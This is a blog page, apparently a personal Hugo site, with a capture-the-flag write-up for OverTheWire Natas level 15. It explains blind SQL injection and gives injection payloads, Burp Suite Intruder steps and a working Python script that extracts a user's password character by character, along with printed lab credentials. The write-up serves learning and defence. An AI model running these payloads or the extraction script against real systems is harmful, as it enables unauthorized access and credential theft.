@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Level 15 - My New Hugo Site</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/natas/level15/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Level 15">
+  <meta property="og:description" content="State “DONE” from [2025-03-27 Thu 14:45] http://natas15.natas.labs.overthewire.org/
+This level starts very similar to level 14, however no we only check for the existence of a user using an input field:
+Entering natas16 lets us know that this user exists. However, when we look at the sourcecode we see that we have a problem here:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="natas">
+    <meta property="article:published_time" content="2025-03-27T14:45:00+01:00">
+    <meta property="article:modified_time" content="2025-03-27T14:45:00+01:00">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Hacking">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Level 15">
+  <meta name="twitter:description" content="State “DONE” from [2025-03-27 Thu 14:45] http://natas15.natas.labs.overthewire.org/
+This level starts very similar to level 14, however no we only check for the existence of a user using an input field:
+Entering natas16 lets us know that this user exists. However, when we look at the sourcecode we see that we have a problem here:">
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/natas/level15/" /><link rel="prev" href="http://localhost:1313/natas/level2/" /><link rel="next" href="http://localhost:1313/natas/level14/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Level 15",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/natas\/level15\/"
+        },"genre": "natas","keywords": "cybersecurity, hacking","wordcount":  1327 ,
+        "url": "http:\/\/localhost:1313\/natas\/level15\/","datePublished": "2025-03-27T14:45:00+01:00","dateModified": "2025-03-27T14:45:00+01:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "xxxx"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">My cool site</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">My cool site</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Level 15</h1><div class="content" id="content"><ul>
+<li>State &ldquo;DONE&rdquo;       from              <!-- raw HTML omitted --><!-- raw HTML omitted -->[2025-03-27 Thu 14:45]<!-- raw HTML omitted --><!-- raw HTML omitted --></li>
+</ul>
+<p><a href="http://natas15.natas.labs.overthewire.org/" target="_blank" rel="noopener noreffer ">http://natas15.natas.labs.overthewire.org/</a></p>
+<p>This level starts very similar to level 14, however no we only check for the existence of a user using an input field:</p>
+<figure><img src="/ox-hugo/clipboard-20250319T130841.png">
+</figure>
+
+<p>Entering <code>natas16</code> lets us know that this user exists. However, when we look at the sourcecode we see that we have a problem here:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-web">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code class="language-web" data-lang="web">  &lt;html&gt;
+&lt;head&gt;
+&lt;!-- This stuff in the header has nothing to do with the level --&gt;
+&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;http://natas.labs.overthewire.org/css/level.css&#34;&gt;
+&lt;link rel=&#34;stylesheet&#34; href=&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34; /&gt;
+&lt;link rel=&#34;stylesheet&#34; href=&#34;http://natas.labs.overthewire.org/css/wechall.css&#34; /&gt;
+&lt;script src=&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;&gt;&lt;/script&gt;
+&lt;script src=&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;&gt;&lt;/script&gt;
+&lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;&gt;&lt;/script&gt;
+&lt;script&gt;var wechallinfo = { &#34;level&#34;: &#34;natas15&#34;, &#34;pass&#34;: &#34;&lt;censored&gt;&#34; };&lt;/script&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas15&lt;/h1&gt;
+&lt;div id=&#34;content&#34;&gt;
+&lt;?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists(&#34;username&#34;, $_REQUEST)) {
+    $link = mysqli_connect(&#39;localhost&#39;, &#39;natas15&#39;, &#39;&lt;censored&gt;&#39;);
+    mysqli_select_db($link, &#39;natas15&#39;);
+
+    $query = &#34;SELECT * from users where username=\&#34;&#34;.$_REQUEST[&#34;username&#34;].&#34;\&#34;&#34;;
+    if(array_key_exists(&#34;debug&#34;, $_GET)) {
+        echo &#34;Executing query: $query&lt;br&gt;&#34;;
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) &gt; 0) {
+        echo &#34;This user exists.&lt;br&gt;&#34;;
+    } else {
+        echo &#34;This user doesn&#39;t exist.&lt;br&gt;&#34;;
+    }
+    } else {
+        echo &#34;Error in query.&lt;br&gt;&#34;;
+    }
+
+    mysqli_close($link);
+} else {
+?&gt;
+
+&lt;form action=&#34;index.php&#34; method=&#34;POST&#34;&gt;
+Username: &lt;input name=&#34;username&#34;&gt;&lt;br&gt;
+&lt;input type=&#34;submit&#34; value=&#34;Check existence&#34; /&gt;
+&lt;/form&gt;
+&lt;?php } ?&gt;
+&lt;div id=&#34;viewsource&#34;&gt;&lt;a href=&#34;index-source.html&#34;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+<p>So the logical flow is as follows:</p>
+<ul>
+<li>Check if an input for username is given, if so connect to the database using natas15 and a censored password</li>
+<li>Then there is some logic checking if the username is in the database. As before the SQL input is unsanitized and allows for SQL injection</li>
+<li>However, there is a major problem here: the code does not contain any functions to display the actual result of the SQL query.</li>
+</ul>
+<p>So, we do not have any way - using this sourcecode - to directly show the password for the user natas16. This means we need to think outside the box.</p>
+<h2 id="background-blind-sql-injection">Background: Blind SQL injection</h2>
+<p>The way forward leads through something called &ldquo;blind SQL injection&rdquo;. Here is what owasp has to say about blind SQL injection:</p>
+<blockquote>
+<p>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>
+<p>When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query’s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible.</p></blockquote>
+<p>An example:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://newspaper.com/items.php?id=2</span></span></code></pre></div></div>
+<p>sends the following query to the database:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">description</span><span class="p">,</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">items</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span></span></span></code></pre></div></div>
+<p>The attacker may then try to inject a query that returns &lsquo;false&rsquo;:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://newspaper.com/items.php?id=2 and 1=2</span></span></code></pre></div></div>
+<p>This makes the SQL query something like this:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">title</span><span class="p">,</span><span class="w"> </span><span class="n">description</span><span class="p">,</span><span class="w"> </span><span class="n">body</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">items</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span></span></span></code></pre></div></div>
+<p>If the web app is vulnerable to SQL injection, it will probably not return anything. To make sure we can inject a query that wil return <code>TRUE</code>:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://newspaper.com/items.php?id=2 and 1=1</span></span></code></pre></div></div>
+<p>If the content of the page that returns <code>TRUE</code> is different than that of the page that returns <code>FALSE</code> then the attacker is able to distinguish when the executed query returns true or false</p>
+<p>So recap:</p>
+<ul>
+<li>In blind SQL injection we first use a known true statement vs. a known false statement to determine if there are different answers from the server for both.</li>
+<li>If there are we can use this to our advantage</li>
+<li></li>
+</ul>
+<h3 id="time-based-injection">Time-based injection</h3>
+<p>TODO</p>
+<h2 id="using-blind-sql-injection-to-solve-level-15">Using blind SQL injection to solve level 15</h2>
+<p>So how can we use this to our advantage to solve this level? Let&rsquo;s think about what we know and what we want:</p>
+<ul>
+<li>We know that the user with the username &rsquo;natas16&rsquo; exists because of the structure of the challenges for &rsquo;natas&rsquo; and because we have tried in the form.</li>
+<li>We know there is usually a password associated that is 32 alphanumerical characters long.</li>
+</ul>
+<p>So what we need to do is create a query that looks something like this:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;32charpassword&#39;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>But: we do not know the 32 characters of the password. However, what do we know? We know that if attack with a SQL injection that gives us back a result/prints a row, the website gives us back a different reply than in the case of a faulty SQL query. How can we use this to our advantage?</p>
+<p>Think about the following query:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">;</span></span></span></code></pre></div></div>
+<p>If the first letter of the password is &lsquo;a&rsquo;, we will get back a &lsquo;positive&rsquo; result, i.e. a response containing the Text &ldquo;This entry exists&rdquo;. If not, we will get back a different result. So we need a way to test all alphanumerical characters in the query above. We can obviously do this manually, but considering the password has 32 letters, this would be madness. Instead, we have two options: using burpsuite or a custom script.</p>
+<h3 id="blind-sql-injection-with-burpsuite">Blind SQL injection with burpsuite</h3>
+<p>As before, open burpsuite, open the included browser, go to the natas15 page and set intercept to &ldquo;on&rdquo;. Then insert the SQL query snippet ~&quot; OR substring(password,1,1) = &ldquo;a&rdquo; &ndash; ~ (do not forget the space at the end or your query will not work) and click the button.</p>
+<figure><img src="/ox-hugo/clipboard-20250321T110819.png">
+</figure>
+
+<p>Then move to burpsuite Proxy and forward the intercepted request to the Intruder. Here, set the &ldquo;debug&rdquo; bit and then mark the payload you want to manipulate - in our case the a in the query and click <code>Add §</code>. This opens the payloads window, select <code>Brute Forcer</code> and reduce the min/max length to 1 (we want only 1 character at this point, bc. the free version of burpsuite is throttled, anything else would take forever).</p>
+<figure><img src="/ox-hugo/clipboard-20250321T120612.png">
+</figure>
+
+<p>This opens a window where we see the results of our attack. We can see that for every letter we get one response back. If you look at the &ldquo;length column&rdquo;, you can see that one response seems to be of different length than the others implying that this might be our candidate. And indeed - if we click this and look at the resposne we can see that we are told &ldquo;This user exists&rdquo;. This means &ldquo;h&rdquo; is most likely the first letter of our password.</p>
+<figure><img src="/ox-hugo/clipboard-20250321T120549.png">
+</figure>
+
+<p>We can then move on to the next letter by using this query, which gives us the letter &ldquo;p&rdquo;:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s2">&#34; OR substring(password,1,2) = &#34;</span><span class="n">ha</span><span class="s2">&#34; --</span></span></span></code></pre></div></div>
+<p>This would work, but is also quite unwieldy, especially with longer passwords and a throttled burpsuite version. Instead of using burpsuite, we can also use a python script to do this task.</p>
+<h3 id="blind-sql-injection-with-python">Blind SQL injection with python</h3>
+<p>We can make our SQL injection a bit more precise: We already know that the user is natas16, so we can input this user and look for its password in order to avoid mistakes:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">natas16</span><span class="s2">&#34; AND BINARY substring(password,1,1=&#34;</span><span class="n">a</span><span class="s2">&#34; --</span></span></span></code></pre></div></div>
+<p>This gives us the following script:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://natas15.natas.labs.overthewire.org/index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;natas15&#34;</span><span class="p">,</span> <span class="s2">&#34;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+</span></span><span class="line"><span class="cl"><span class="n">found_password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">found_char</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;natas16&#34; AND BINARY substring(password,1,</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">found_password</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s1">)=&#34;</span><span class="si">{</span><span class="n">found_password</span> <span class="o">+</span> <span class="n">char</span><span class="si">}</span><span class="s1">&#34; -- &#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;This user exists&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">found_password</span> <span class="o">+=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Found password so far: </span><span class="si">{</span><span class="n">found_password</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">found_char</span> <span class="o">=</span> <span class="n">char</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">found_char</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>  <span class="c1"># Stop if no new characters are found</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Extracted password: </span><span class="si">{</span><span class="n">found_password</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>And here we see the script in action:</p>
+<figure><img src="/ox-hugo/clipboard-20250322T115551.png">
+</figure>
+
+<ul>
+<li>And our password is: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo</li>
+<li></li>
+</ul>
+<h2 id="security-implications">Security implications</h2>
+<ul>
+<li>Even when you do not give back text as output, you might be giving things away when allowing for SQL injection.</li>
+<li>Sanitize your user input!</li>
+</ul>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
